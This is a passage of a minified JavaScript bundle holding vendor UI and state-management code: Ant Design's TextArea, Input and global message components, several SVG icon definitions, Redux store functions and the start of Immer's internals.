      ot = o.autoSize,
      st = o.onResize,
      ft = o.className,
      ht = o.style,
      gt = o.disabled,
      St = o.onChange;
    o.onInternalAutoSize;
    var vt = _objectWithoutProperties$1(o, _excluded$3),
      _t = useMergedState(tt, {
        value: nt,
        postState: function (Ht) {
          return Ht ?? "";
        },
      }),
      Et = _slicedToArray$1(_t, 2),
      Ct = Et[0],
      Pt = Et[1],
      bt = function (Ht) {
        Pt(Ht.target.value), St == null || St(Ht);
      },
      xt = reactExports.useRef();
    reactExports.useImperativeHandle(a, function () {
      return { textArea: xt.current };
    });
    var yt = reactExports.useMemo(
        function () {
          return ot && _typeof(ot) === "object" ? [ot.minRows, ot.maxRows] : [];
        },
        [ot]
      ),
      wt = _slicedToArray$1(yt, 2),
      $t = wt[0],
      kt = wt[1],
      Rt = !!ot,
      It = function () {
        try {
          if (document.activeElement === xt.current) {
            var Ht = xt.current,
              Kt = Ht.selectionStart,
              qt = Ht.selectionEnd,
              Qt = Ht.scrollTop;
            xt.current.setSelectionRange(Kt, qt), (xt.current.scrollTop = Qt);
          }
        } catch {}
      },
      Ot = reactExports.useState(RESIZE_STABLE),
      Nt = _slicedToArray$1(Ot, 2),
      zt = Nt[0],
      Bt = Nt[1],
      Wt = reactExports.useState(),
      Gt = _slicedToArray$1(Wt, 2),
      Vt = Gt[0],
      Mt = Gt[1],
      Ft = function () {
        Bt(RESIZE_START);
      };
    useLayoutEffect(
      function () {
        Rt && Ft();
      },
      [nt, $t, kt, Rt]
    ),
      useLayoutEffect(
        function () {
          if (zt === RESIZE_START) Bt(RESIZE_MEASURING);
          else if (zt === RESIZE_MEASURING) {
            var Ut = calculateAutoSizeStyle(xt.current, !1, $t, kt);
            Bt(RESIZE_STABLE), Mt(Ut);
          } else It();
        },
        [zt]
      );
    var Tt = reactExports.useRef(),
      At = function () {
        wrapperRaf.cancel(Tt.current);
      },
      Lt = function (Ht) {
        zt === RESIZE_STABLE &&
          (st == null || st(Ht),
          ot &&
            (At(),
            (Tt.current = wrapperRaf(function () {
              Ft();
            }))));
      };
    reactExports.useEffect(function () {
      return At;
    }, []);
    var jt = Rt ? Vt : null,
      Dt = _objectSpread2$1(_objectSpread2$1({}, ht), jt);
    return (
      (zt === RESIZE_START || zt === RESIZE_MEASURING) &&
        ((Dt.overflowY = "hidden"), (Dt.overflowX = "hidden")),
      reactExports.createElement(
        RefResizeObserver,
        { onResize: Lt, disabled: !(ot || st) },
        reactExports.createElement(
          "textarea",
          _extends({}, vt, {
            ref: xt,
            style: Dt,
            className: classNames(
              s,
              ft,
              _defineProperty$1({}, "".concat(s, "-disabled"), gt)
            ),
            disabled: gt,
            value: Ct,
            onChange: bt,
          })
        )
      )
    );
  }),
  _excluded$2 = [
    "defaultValue",
    "value",
    "onFocus",
    "onBlur",
    "onChange",
    "allowClear",
    "maxLength",
    "onCompositionStart",
    "onCompositionEnd",
    "suffix",
    "prefixCls",
    "showCount",
    "count",
    "className",
    "style",
    "disabled",
    "hidden",
    "classNames",
    "styles",
    "onResize",
    "onClear",
    "onPressEnter",
    "readOnly",
    "autoSize",
    "onKeyDown",
  ],
  TextArea$1 = React$1.forwardRef(function (i, a) {
    var o,
      s = i.defaultValue,
      tt = i.value,
      nt = i.onFocus,
      ot = i.onBlur,
      st = i.onChange,
      ft = i.allowClear,
      ht = i.maxLength,
      gt = i.onCompositionStart,
      St = i.onCompositionEnd,
      vt = i.suffix,
      _t = i.prefixCls,
      Et = _t === void 0 ? "rc-textarea" : _t,
      Ct = i.showCount,
      Pt = i.count,
      bt = i.className,
      xt = i.style,
      yt = i.disabled,
      wt = i.hidden,
      $t = i.classNames,
      kt = i.styles,
      Rt = i.onResize,
      It = i.onClear,
      Ot = i.onPressEnter,
      Nt = i.readOnly,
      zt = i.autoSize,
      Bt = i.onKeyDown,
      Wt = _objectWithoutProperties$1(i, _excluded$2),
      Gt = useMergedState(s, { value: tt, defaultValue: s }),
      Vt = _slicedToArray$1(Gt, 2),
      Mt = Vt[0],
      Ft = Vt[1],
      Tt = Mt == null ? "" : String(Mt),
      At = React$1.useState(!1),
      Lt = _slicedToArray$1(At, 2),
      jt = Lt[0],
      Dt = Lt[1],
      Ut = React$1.useRef(!1),
      Ht = React$1.useState(null),
      Kt = _slicedToArray$1(Ht, 2),
      qt = Kt[0],
      Qt = Kt[1],
      Zt = reactExports.useRef(null),
      Jt = reactExports.useRef(null),
      er = function () {
        var lr;
        return (lr = Jt.current) === null || lr === void 0
          ? void 0
          : lr.textArea;
      },
      sr = function () {
        er().focus();
      };
    reactExports.useImperativeHandle(a, function () {
      var ur;
      return {
        resizableTextArea: Jt.current,
        focus: sr,
        blur: function () {
          er().blur();
        },
        nativeElement:
          ((ur = Zt.current) === null || ur === void 0
            ? void 0
            : ur.nativeElement) || er(),
      };
    }),
      reactExports.useEffect(
        function () {
          Dt(function (ur) {
            return !yt && ur;
          });
        },
        [yt]
      );
    var nr = React$1.useState(null),
      tr = _slicedToArray$1(nr, 2),
      Xt = tr[0],
      hr = tr[1];
    React$1.useEffect(
      function () {
        if (Xt) {
          var ur;
          (ur = er()).setSelectionRange.apply(ur, _toConsumableArray(Xt));
        }
      },
      [Xt]
    );
    var cr = useCount(Pt, Ct),
      yr = (o = cr.max) !== null && o !== void 0 ? o : ht,
      vr = Number(yr) > 0,
      xr = cr.strategy(Tt),
      Sr = !!yr && xr > yr,
      or = function (lr, Fr) {
        var Vr = Fr;
        !Ut.current &&
          cr.exceedFormatter &&
          cr.max &&
          cr.strategy(Fr) > cr.max &&
          ((Vr = cr.exceedFormatter(Fr, { max: cr.max })),
          Fr !== Vr && hr([er().selectionStart || 0, er().selectionEnd || 0])),
          Ft(Vr),
          resolveOnChange(lr.currentTarget, lr, st, Vr);
      },
      mr = function (lr) {
        (Ut.current = !0), gt == null || gt(lr);
      },
      Yt = function (lr) {
        (Ut.current = !1), or(lr, lr.currentTarget.value), St == null || St(lr);
      },
      rr = function (lr) {
        or(lr, lr.target.value);
      },
      ar = function (lr) {
        lr.key === "Enter" && Ot && Ot(lr), Bt == null || Bt(lr);
      },
      gr = function (lr) {
        Dt(!0), nt == null || nt(lr);
      },
      br = function (lr) {
        Dt(!1), ot == null || ot(lr);
      },
      Cr = function (lr) {
        Ft(""), sr(), resolveOnChange(er(), lr, st);
      },
      Rr = vt,
      Ar;
    cr.show &&
      (cr.showFormatter
        ? (Ar = cr.showFormatter({ value: Tt, count: xr, maxLength: yr }))
        : (Ar = "".concat(xr).concat(vr ? " / ".concat(yr) : "")),
      (Rr = React$1.createElement(
        React$1.Fragment,
        null,
        Rr,
        React$1.createElement(
          "span",
          {
            className: classNames(
              "".concat(Et, "-data-count"),
              $t == null ? void 0 : $t.count
            ),
            style: kt == null ? void 0 : kt.count,
          },
          Ar
        )
      )));
    var Ur = function (lr) {
        var Fr;
        Rt == null || Rt(lr),
          (Fr = er()) !== null && Fr !== void 0 && Fr.style.height && Qt(!0);
      },
      Ir = !zt && !Ct && !ft;
    return React$1.createElement(
      BaseInput,
      {
        ref: Zt,
        value: Tt,
        allowClear: ft,
        handleReset: Cr,
        suffix: Rr,
        prefixCls: Et,
        classNames: _objectSpread2$1(
          _objectSpread2$1({}, $t),
          {},
          {
            affixWrapper: classNames(
              $t == null ? void 0 : $t.affixWrapper,
              _defineProperty$1(
                _defineProperty$1({}, "".concat(Et, "-show-count"), Ct),
                "".concat(Et, "-textarea-allow-clear"),
                ft
              )
            ),
          }
        ),
        disabled: yt,
        focused: jt,
        className: classNames(bt, Sr && "".concat(Et, "-out-of-range")),
        style: _objectSpread2$1(
          _objectSpread2$1({}, xt),
          qt && !Ir ? { height: "auto" } : {}
        ),
        dataAttrs: {
          affixWrapper: { "data-count": typeof Ar == "string" ? Ar : void 0 },
        },
        hidden: wt,
        readOnly: Nt,
        onClear: It,
      },
      React$1.createElement(
        ResizableTextArea,
        _extends({}, Wt, {
          autoSize: zt,
          maxLength: ht,
          onKeyDown: ar,
          onChange: rr,
          onFocus: gr,
          onBlur: br,
          onCompositionStart: mr,
          onCompositionEnd: Yt,
          className: classNames($t == null ? void 0 : $t.textarea),
          style: _objectSpread2$1(
            _objectSpread2$1({}, kt == null ? void 0 : kt.textarea),
            {},
            { resize: xt == null ? void 0 : xt.resize }
          ),
          disabled: yt,
          prefixCls: Et,
          onResize: Ur,
          ref: Jt,
          readOnly: Nt,
        })
      )
    );
  }),
  __rest = function (i, a) {
    var o = {};
    for (var s in i)
      Object.prototype.hasOwnProperty.call(i, s) &&
        a.indexOf(s) < 0 &&
        (o[s] = i[s]);
    if (i != null && typeof Object.getOwnPropertySymbols == "function")
      for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
        a.indexOf(s[tt]) < 0 &&
          Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
          (o[s[tt]] = i[s[tt]]);
    return o;
  };
const TextArea = reactExports.forwardRef((i, a) => {
    var o, s;
    const {
        prefixCls: tt,
        bordered: nt = !0,
        size: ot,
        disabled: st,
        status: ft,
        allowClear: ht,
        classNames: gt,
        rootClassName: St,
        className: vt,
        style: _t,
        styles: Et,
        variant: Ct,
      } = i,
      Pt = __rest(i, [
        "prefixCls",
        "bordered",
        "size",
        "disabled",
        "status",
        "allowClear",
        "classNames",
        "rootClassName",
        "className",
        "style",
        "styles",
        "variant",
      ]),
      {
        getPrefixCls: bt,
        direction: xt,
        textArea: yt,
      } = reactExports.useContext(ConfigContext),
      wt = useSize(ot),
      $t = reactExports.useContext(DisabledContext),
      kt = st ?? $t,
      {
        status: Rt,
        hasFeedback: It,
        feedbackIcon: Ot,
      } = reactExports.useContext(FormItemInputContext),
      Nt = getMergedStatus(Rt, ft),
      zt = reactExports.useRef(null);
    reactExports.useImperativeHandle(a, () => {
      var Lt;
      return {
        resizableTextArea:
          (Lt = zt.current) === null || Lt === void 0
            ? void 0
            : Lt.resizableTextArea,
        focus: (jt) => {
          var Dt, Ut;
          triggerFocus(
            (Ut =
              (Dt = zt.current) === null || Dt === void 0
                ? void 0
                : Dt.resizableTextArea) === null || Ut === void 0
              ? void 0
              : Ut.textArea,
            jt
          );
        },
        blur: () => {
          var jt;
          return (jt = zt.current) === null || jt === void 0
            ? void 0
            : jt.blur();
        },
      };
    });
    const Bt = bt("input", tt),
      Wt = useCSSVarCls(Bt),
      [Gt, Vt, Mt] = useStyle$2(Bt, Wt),
      [Ft, Tt] = useVariant("textArea", Ct, nt),
      At = getAllowClear(ht ?? (yt == null ? void 0 : yt.allowClear));
    return Gt(
      reactExports.createElement(
        TextArea$1,
        Object.assign(
          { autoComplete: yt == null ? void 0 : yt.autoComplete },
          Pt,
          {
            style: Object.assign(
              Object.assign({}, yt == null ? void 0 : yt.style),
              _t
            ),
            styles: Object.assign(
              Object.assign({}, yt == null ? void 0 : yt.styles),
              Et
            ),
            disabled: kt,
            allowClear: At,
            className: classNames(
              Mt,
              Wt,
              vt,
              St,
              yt == null ? void 0 : yt.className
            ),
            classNames: Object.assign(
              Object.assign(
                Object.assign({}, gt),
                yt == null ? void 0 : yt.classNames
              ),
              {
                textarea: classNames(
                  {
                    [`${Bt}-sm`]: wt === "small",
                    [`${Bt}-lg`]: wt === "large",
                  },
                  Vt,
                  gt == null ? void 0 : gt.textarea,
                  (o = yt == null ? void 0 : yt.classNames) === null ||
                    o === void 0
                    ? void 0
                    : o.textarea
                ),
                variant: classNames(
                  { [`${Bt}-${Ft}`]: Tt },
                  getStatusClassNames(Bt, Nt)
                ),
                affixWrapper: classNames(
                  `${Bt}-textarea-affix-wrapper`,
                  {
                    [`${Bt}-affix-wrapper-rtl`]: xt === "rtl",
                    [`${Bt}-affix-wrapper-sm`]: wt === "small",
                    [`${Bt}-affix-wrapper-lg`]: wt === "large",
                    [`${Bt}-textarea-show-count`]:
                      i.showCount ||
                      ((s = i.count) === null || s === void 0
                        ? void 0
                        : s.show),
                  },
                  Vt
                ),
              }
            ),
            prefixCls: Bt,
            suffix:
              It &&
              reactExports.createElement(
                "span",
                { className: `${Bt}-textarea-suffix` },
                Ot
              ),
            ref: zt,
          }
        )
      )
    );
  }),
  Input = Input$1;
Input.Group = Group;
Input.Search = Search;
Input.TextArea = TextArea;
Input.Password = Password;
Input.OTP = OTP;
let message = null,
  act = (i) => i(),
  taskQueue = [],
  defaultGlobalConfig = {};
function getGlobalContext() {
  const {
      getContainer: i,
      duration: a,
      rtl: o,
      maxCount: s,
      top: tt,
    } = defaultGlobalConfig,
    nt = (i == null ? void 0 : i()) || document.body;
  return { getContainer: () => nt, duration: a, rtl: o, maxCount: s, top: tt };
}
const GlobalHolder = React$1.forwardRef((i, a) => {
    const { messageConfig: o, sync: s } = i,
      { getPrefixCls: tt } = reactExports.useContext(ConfigContext),
      nt = defaultGlobalConfig.prefixCls || tt("message"),
      ot = reactExports.useContext(AppConfigContext),
      [st, ft] = useInternalMessage(
        Object.assign(
          Object.assign(Object.assign({}, o), { prefixCls: nt }),
          ot.message
        )
      );
    return (
      React$1.useImperativeHandle(a, () => {
        const ht = Object.assign({}, st);
        return (
          Object.keys(ht).forEach((gt) => {
            ht[gt] = function () {
              return s(), st[gt].apply(st, arguments);
            };
          }),
          { instance: ht, sync: s }
        );
      }),
      ft
    );
  }),
  GlobalHolderWrapper = React$1.forwardRef((i, a) => {
    const [o, s] = React$1.useState(getGlobalContext),
      tt = () => {
        s(getGlobalContext);
      };
    React$1.useEffect(tt, []);
    const nt = globalConfig(),
      ot = nt.getRootPrefixCls(),
      st = nt.getIconPrefixCls(),
      ft = nt.getTheme(),
      ht = React$1.createElement(GlobalHolder, {
        ref: a,
        sync: tt,
        messageConfig: o,
      });
    return React$1.createElement(
      ConfigProvider,
      { prefixCls: ot, iconPrefixCls: st, theme: ft },
      nt.holderRender ? nt.holderRender(ht) : ht
    );
  });
function flushNotice() {
  if (!message) {
    const i = document.createDocumentFragment(),
      a = { fragment: i };
    (message = a),
      act(() => {
        getReactRender()(
          React$1.createElement(GlobalHolderWrapper, {
            ref: (s) => {
              const { instance: tt, sync: nt } = s || {};
              Promise.resolve().then(() => {
                !a.instance &&
                  tt &&
                  ((a.instance = tt), (a.sync = nt), flushNotice());
              });
            },
          }),
          i
        );
      });
    return;
  }
  message.instance &&
    (taskQueue.forEach((i) => {
      const { type: a, skipped: o } = i;
      if (!o)
        switch (a) {
          case "open": {
            act(() => {
              const s = message.instance.open(
                Object.assign(Object.assign({}, defaultGlobalConfig), i.config)
              );
              s == null || s.then(i.resolve), i.setCloseFn(s);
            });
            break;
          }
          case "destroy":
            act(() => {
              message == null || message.instance.destroy(i.key);
            });
            break;
          default:
            act(() => {
              var s;
              const tt = (s = message.instance)[a].apply(
                s,
                _toConsumableArray(i.args)
              );
              tt == null || tt.then(i.resolve), i.setCloseFn(tt);
            });
        }
    }),
    (taskQueue = []));
}
function setMessageGlobalConfig(i) {
  (defaultGlobalConfig = Object.assign(
    Object.assign({}, defaultGlobalConfig),
    i
  )),
    act(() => {
      var a;
      (a = message == null ? void 0 : message.sync) === null ||
        a === void 0 ||
        a.call(message);
    });
}
function open(i) {
  const a = wrapPromiseFn((o) => {
    let s;
    const tt = {
      type: "open",
      config: i,
      resolve: o,
      setCloseFn: (nt) => {
        s = nt;
      },
    };
    return (
      taskQueue.push(tt),
      () => {
        s
          ? act(() => {
              s();
            })
          : (tt.skipped = !0);
      }
    );
  });
  return flushNotice(), a;
}
function typeOpen(i, a) {
  const o = wrapPromiseFn((s) => {
    let tt;
    const nt = {
      type: i,
      args: a,
      resolve: s,
      setCloseFn: (ot) => {
        tt = ot;
      },
    };
    return (
      taskQueue.push(nt),
      () => {
        tt
          ? act(() => {
              tt();
            })
          : (nt.skipped = !0);
      }
    );
  });
  return flushNotice(), o;
}
const destroy = (i) => {
    taskQueue.push({ type: "destroy", key: i }), flushNotice();
  },
  methods = ["success", "info", "warning", "error", "loading"],
  baseStaticMethods = {
    open,
    destroy,
    config: setMessageGlobalConfig,
    useMessage,
    _InternalPanelDoNotUseOrYouWillBeFired: PurePanel$1,
  },
  staticMethods = baseStaticMethods;
methods.forEach((i) => {
  staticMethods[i] = function () {
    for (var a = arguments.length, o = new Array(a), s = 0; s < a; s++)
      o[s] = arguments[s];
    return typeOpen(i, o);
  };
});
var BugFilled$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M304 280h416c4.4 0 8-3.6 8-8 0-40-8.8-76.7-25.9-108.1a184.31 184.31 0 00-74-74C596.7 72.8 560 64 520 64h-16c-40 0-76.7 8.8-108.1 25.9a184.31 184.31 0 00-74 74C304.8 195.3 296 232 296 272c0 4.4 3.6 8 8 8z",
          },
        },
        {
          tag: "path",
          attrs: {
            d: "M940 512H792V412c76.8 0 139-62.2 139-139 0-4.4-3.6-8-8-8h-60c-4.4 0-8 3.6-8 8a63 63 0 01-63 63H232a63 63 0 01-63-63c0-4.4-3.6-8-8-8h-60c-4.4 0-8 3.6-8 8 0 76.8 62.2 139 139 139v100H84c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h148v96c0 6.5.2 13 .7 19.3C164.1 728.6 116 796.7 116 876c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8 0-44.2 23.9-82.9 59.6-103.7a273 273 0 0022.7 49c24.3 41.5 59 76.2 100.5 100.5 28.9 16.9 61 28.8 95.3 34.5 4.4 0 8-3.6 8-8V484c0-4.4 3.6-8 8-8h60c4.4 0 8 3.6 8 8v464.2c0 4.4 3.6 8 8 8 34.3-5.7 66.4-17.6 95.3-34.5a281.38 281.38 0 00123.2-149.5A120.4 120.4 0 01836 876c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8 0-79.3-48.1-147.4-116.7-176.7.4-6.4.7-12.8.7-19.3v-96h148c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8z",
          },
        },
      ],
    },
    name: "bug",
    theme: "filled",
  },
  BugFilled = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: BugFilled$1 })
    );
  },
  RefIcon$3 = reactExports.forwardRef(BugFilled),
  CodeOutlined$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M516 673c0 4.4 3.4 8 7.5 8h185c4.1 0 7.5-3.6 7.5-8v-48c0-4.4-3.4-8-7.5-8h-185c-4.1 0-7.5 3.6-7.5 8v48zm-194.9 6.1l192-161c3.8-3.2 3.8-9.1 0-12.3l-192-160.9A7.95 7.95 0 00308 351v62.7c0 2.4 1 4.6 2.9 6.1L420.7 512l-109.8 92.2a8.1 8.1 0 00-2.9 6.1V673c0 6.8 7.9 10.5 13.1 6.1zM880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-40 728H184V184h656v656z",
          },
        },
      ],
    },
    name: "code",
    theme: "outlined",
  },
  CodeOutlined = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: CodeOutlined$1 })
    );
  },
  RefIcon$2 = reactExports.forwardRef(CodeOutlined),
  LeftSquareFilled$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zM624 380.9c0 10.2-4.9 19.9-13.2 25.9L465.4 512l145.4 105.2c8.3 6 13.2 15.6 13.2 25.9V690c0 6.5-7.4 10.3-12.7 6.5l-246-178a7.95 7.95 0 010-12.9l246-178c5.3-3.8 12.7 0 12.7 6.5v46.8z",
          },
        },
      ],
    },
    name: "left-square",
    theme: "filled",
  },
  LeftSquareFilled = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: LeftSquareFilled$1 })
    );
  },
  RefIcon$1 = reactExports.forwardRef(LeftSquareFilled),
  UploadOutlined$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M400 317.7h73.9V656c0 4.4 3.6 8 8 8h60c4.4 0 8-3.6 8-8V317.7H624c6.7 0 10.4-7.7 6.3-12.9L518.3 163a8 8 0 00-12.6 0l-112 141.7c-4.1 5.3-.4 13 6.3 13zM878 626h-60c-4.4 0-8 3.6-8 8v154H214V634c0-4.4-3.6-8-8-8h-60c-4.4 0-8 3.6-8 8v198c0 17.7 14.3 32 32 32h684c17.7 0 32-14.3 32-32V634c0-4.4-3.6-8-8-8z",
          },
        },
      ],
    },
    name: "upload",
    theme: "outlined",
  },
  UploadOutlined = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: UploadOutlined$1 })
    );
  },
  RefIcon = reactExports.forwardRef(UploadOutlined);
function formatProdErrorMessage$1(i) {
  return `Minified Redux error #${i}; visit https://redux.js.org/Errors?code=${i} for the full message or use the non-minified dev environment for full errors. `;
}
var $$observable =
    (typeof Symbol == "function" && Symbol.observable) || "@@observable",
  symbol_observable_default = $$observable,
  randomString = () =>
    Math.random().toString(36).substring(7).split("").join("."),
  ActionTypes = {
    INIT: `@@redux/INIT${randomString()}`,
    REPLACE: `@@redux/REPLACE${randomString()}`,
    PROBE_UNKNOWN_ACTION: () => `@@redux/PROBE_UNKNOWN_ACTION${randomString()}`,
  },
  actionTypes_default = ActionTypes;
function isPlainObject$1(i) {
  if (typeof i != "object" || i === null) return !1;
  let a = i;
  for (; Object.getPrototypeOf(a) !== null; ) a = Object.getPrototypeOf(a);
  return Object.getPrototypeOf(i) === a || Object.getPrototypeOf(i) === null;
}
function createStore(i, a, o) {
  if (typeof i != "function") throw new Error(formatProdErrorMessage$1(2));
  if (
    (typeof a == "function" && typeof o == "function") ||
    (typeof o == "function" && typeof arguments[3] == "function")
  )
    throw new Error(formatProdErrorMessage$1(0));
  if (
    (typeof a == "function" && typeof o > "u" && ((o = a), (a = void 0)),
    typeof o < "u")
  ) {
    if (typeof o != "function") throw new Error(formatProdErrorMessage$1(1));
    return o(createStore)(i, a);
  }
  let s = i,
    tt = a,
    nt = new Map(),
    ot = nt,
    st = 0,
    ft = !1;
  function ht() {
    ot === nt &&
      ((ot = new Map()),
      nt.forEach((Pt, bt) => {
        ot.set(bt, Pt);
      }));
  }
  function gt() {
    if (ft) throw new Error(formatProdErrorMessage$1(3));
    return tt;
  }
  function St(Pt) {
    if (typeof Pt != "function") throw new Error(formatProdErrorMessage$1(4));
    if (ft) throw new Error(formatProdErrorMessage$1(5));
    let bt = !0;
    ht();
    const xt = st++;
    return (
      ot.set(xt, Pt),
      function () {
        if (bt) {
          if (ft) throw new Error(formatProdErrorMessage$1(6));
          (bt = !1), ht(), ot.delete(xt), (nt = null);
        }
      }
    );
  }
  function vt(Pt) {
    if (!isPlainObject$1(Pt)) throw new Error(formatProdErrorMessage$1(7));
    if (typeof Pt.type > "u") throw new Error(formatProdErrorMessage$1(8));
    if (typeof Pt.type != "string")
      throw new Error(formatProdErrorMessage$1(17));
    if (ft) throw new Error(formatProdErrorMessage$1(9));
    try {
      (ft = !0), (tt = s(tt, Pt));
    } finally {
      ft = !1;
    }
    return (
      (nt = ot).forEach((xt) => {
        xt();
      }),
      Pt
    );
  }
  function _t(Pt) {
    if (typeof Pt != "function") throw new Error(formatProdErrorMessage$1(10));
    (s = Pt), vt({ type: actionTypes_default.REPLACE });
  }
  function Et() {
    const Pt = St;
    return {
      subscribe(bt) {
        if (typeof bt != "object" || bt === null)
          throw new Error(formatProdErrorMessage$1(11));
        function xt() {
          const wt = bt;
          wt.next && wt.next(gt());
        }
        return xt(), { unsubscribe: Pt(xt) };
      },
      [symbol_observable_default]() {
        return this;
      },
    };
  }
  return (
    vt({ type: actionTypes_default.INIT }),
    {
      dispatch: vt,
      subscribe: St,
      getState: gt,
      replaceReducer: _t,
      [symbol_observable_default]: Et,
    }
  );
}
function assertReducerShape(i) {
  Object.keys(i).forEach((a) => {
    const o = i[a];
    if (typeof o(void 0, { type: actionTypes_default.INIT }) > "u")
      throw new Error(formatProdErrorMessage$1(12));
    if (
      typeof o(void 0, { type: actionTypes_default.PROBE_UNKNOWN_ACTION() }) >
      "u"
    )
      throw new Error(formatProdErrorMessage$1(13));
  });
}
function combineReducers(i) {
  const a = Object.keys(i),
    o = {};
  for (let nt = 0; nt < a.length; nt++) {
    const ot = a[nt];
    typeof i[ot] == "function" && (o[ot] = i[ot]);
  }
  const s = Object.keys(o);
  let tt;
  try {
    assertReducerShape(o);
  } catch (nt) {
    tt = nt;
  }
  return function (ot = {}, st) {
    if (tt) throw tt;
    let ft = !1;
    const ht = {};
    for (let gt = 0; gt < s.length; gt++) {
      const St = s[gt],
        vt = o[St],
        _t = ot[St],
        Et = vt(_t, st);
      if (typeof Et > "u")
        throw (st && st.type, new Error(formatProdErrorMessage$1(14)));
      (ht[St] = Et), (ft = ft || Et !== _t);
    }
    return (ft = ft || s.length !== Object.keys(ot).length), ft ? ht : ot;
  };
}
function compose(...i) {
  return i.length === 0
    ? (a) => a
    : i.length === 1
    ? i[0]
    : i.reduce(
        (a, o) =>
          (...s) =>
            a(o(...s))
      );
}
function applyMiddleware(...i) {
  return (a) => (o, s) => {
    const tt = a(o, s);
    let nt = () => {
      throw new Error(formatProdErrorMessage$1(15));
    };
    const ot = {
        getState: tt.getState,
        dispatch: (ft, ...ht) => nt(ft, ...ht),
      },
      st = i.map((ft) => ft(ot));
    return (nt = compose(...st)(tt.dispatch)), { ...tt, dispatch: nt };
  };
}
function isAction(i) {
  return isPlainObject$1(i) && "type" in i && typeof i.type == "string";
}
var NOTHING = Symbol.for("immer-nothing"),
  DRAFTABLE = Symbol.for("immer-draftable"),
  DRAFT_STATE = Symbol.for("immer-state");
function die(i, ...a) {
  throw new Error(
    `[Immer] minified error nr: ${i}. Full error at: https://bit.ly/3cXEKWf`
  );
}
var getPrototypeOf = Object.getPrototypeOf;
function isDraft(i) {
  return !!i && !!i[DRAFT_STATE];
}
function isDraftable(i) {
  var a;
  return i
    ? isPlainObject(i) ||
        Array.isArray(i) ||
        !!i[DRAFTABLE] ||
        !!((a = i.constructor) != null && a[DRAFTABLE]) ||
        isMap(i) ||
        isSet(i)
    : !1;
}
var objectCtorString = Object.prototype.constructor.toString();
function isPlainObject(i) {
  if (!i || typeof i != "object") return !1;
  const a = getPrototypeOf(i);
  if (a === null) return !0;
  const o = Object.hasOwnProperty.call(a, "constructor") && a.constructor;
  return o === Object
    ? !0
    : typeof o == "function" && Function.toString.call(o) === objectCtorString;
}
function each(i, a) {
  getArchtype(i) === 0
    ? Reflect.ownKeys(i).forEach((o) => {
        a(o, i[o], i);
      })
    : i.forEach((o, s) => a(s, o, i));
}
function getArchtype(i) {
  const a = i[DRAFT_STATE];
  return a ? a.type_ : Array.isArray(i) ? 1 : isMap(i) ? 2 : isSet(i) ? 3 : 0;
}
function has(i, a) {
  return getArchtype(i) === 2
    ? i.has(a)
    : Object.prototype.hasOwnProperty.call(i, a);
}
function set(i, a, o) {
  const s = getArchtype(i);
  s === 2 ? i.set(a, o) : s === 3 ? i.add(o) : (i[a] = o);
}
function is(i, a) {
  return i === a ? i !== 0 || 1 / i === 1 / a : i !== i && a !== a;
}
function isMap(i) {
  return i instanceof Map;
}
function isSet(i) {
  return i instanceof Set;
}
function latest(i) {
  return i.copy_ || i.base_;
}
function shallowCopy(i, a) {
  if (isMap(i)) return new Map(i);
  if (isSet(i)) return new Set(i);
  if (Array.isArray(i)) return Array.prototype.slice.call(i);
  const o = isPlainObject(i);
  if (a === !0 || (a === "class_only" && !o)) {
    const s = Object.getOwnPropertyDescriptors(i);
    delete s[DRAFT_STATE];
    let tt = Reflect.ownKeys(s);
    for (let nt = 0; nt < tt.length; nt++) {
      const ot = tt[nt],
        st = s[ot];
      st.writable === !1 && ((st.writable = !0), (st.configurable = !0)),
        (st.get || st.set) &&
          (s[ot] = {
            configurable: !0,
            writable: !0,
            enumerable: st.enumerable,
            value: i[ot],
          });
    }
    return Object.create(getPrototypeOf(i), s);
  } else {
    const s = getPrototypeOf(i);
    if (s !== null && o) return { ...i };
    const tt = Object.create(s);
    return Object.assign(tt, i);
  }
}
function freeze(i, a = !1) {
  return (
    isFrozen(i) ||
      isDraft(i) ||
      !isDraftable(i) ||
      (getArchtype(i) > 1 &&
        (i.set = i.add = i.clear = i.delete = dontMutateFrozenCollections),
      Object.freeze(i),
      a && Object.entries(i).forEach(([o, s]) => freeze(s, !0))),
    i
  );
}
function dontMutateFrozenCollections() {
  die(2);
}
function isFrozen(i) {
  return Object.isFrozen(i);
}
var plugins = {};
function getPlugin(i) {
  const a = plugins[i];
  return a || die(0, i), a;
}
var currentScope;
function getCurrentScope() {
  return currentScope;
}
function createScope(i, a) {
  return {
    drafts_: [],
    parent_: i,
    immer_: a,
    canAutoFreeze_: !0,
    unfinalizedDrafts_: 0,
  };
}
function usePatchesInScope(i, a) {
  a &&
    (getPlugin("Patches"),
    (i.patches_ = []),
    (i.inversePatches_ = []),
    (i.patchListener_ = a));
}
function revokeScope(i) {
  leaveScope(i), i.drafts_.forEach(revokeDraft), (i.drafts_ = null);
}
function leaveScope(i) {
  i === currentScope && (currentScope = i.parent_);
}
function enterScope(i) {
  return (currentScope = createScope(currentScope, i));
}
function revokeDraft(i) {
  const a = i[DRAFT_STATE];
  a.type_ === 0 || a.type_ === 1 ? a.revoke_() : (a.revoked_ = !0);
}
function processResult(i, a) {
